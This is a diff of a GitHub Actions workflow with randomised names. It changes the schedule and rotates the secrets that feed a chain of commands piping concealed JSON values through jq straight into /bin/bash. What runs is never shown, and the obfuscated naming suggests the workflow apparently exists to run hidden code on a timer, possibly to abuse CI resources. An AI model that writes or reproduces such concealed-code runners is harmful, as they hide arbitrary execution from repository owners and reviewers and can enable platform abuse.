@@ -2,7 +2,7 @@ name: xieqianli3765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 4/6 * * *'
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,22 +10,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: xieqianli3765
         env:
-          zgmlx8306: ${{ secrets.zgmlx8306 }}
+          le90121: ${{ secrets.le90121 }}
         run: |
-          echo $zgmlx8306 | jq -r .lwfrz20 | /bin/bash
-          echo $hwe22187 | jq -r .dyfnv9 | /bin/bash
-          echo $vckw5427 | jq -r .gk121 | /bin/bash
-          echo $tqolt5 | jq -r .mk34795 | /bin/bash
-          echo $spvt4484 | jq -r .eo593 | /bin/bash
-          echo $eg10 | jq -r .ub4 | /bin/bash
-          echo $m9 | jq -r .ub2419 | /bin/bash
-          echo $hvxo2 | jq -r .kjpi74078 | /bin/bash
-          echo $o527 | jq -r .cobkz370 | /bin/bash
-          echo $n0 | jq -r .ufaw2458 | /bin/bash
-          echo $pbdog373 | jq -r .z0381 | /bin/bash
-          echo $yfp91 | jq -r .gu4 | /bin/bash
-          echo $r3664 | jq -r .a7 | /bin/bash
-          echo $t0 | jq -r .anae24 | /bin/bash
-          echo $wvu38533 | jq -r .pbo537 | /bin/bash
-          echo $chdvc5464 | jq -r .mrp2797 | /bin/bash
+          echo $le90121 | jq -r .syp9831 | /bin/bash
+          echo $hjcc3 | jq -r .dzga62480 | /bin/bash
+          echo $mcjam68695 | jq -r .mt4457 | /bin/bash
+          echo $wdpir527 | jq -r .mtfg164 | /bin/bash
+          echo $ka6 | jq -r .jtziu5 | /bin/bash
+          echo $x08537 | jq -r .bmjp908 | /bin/bash
 
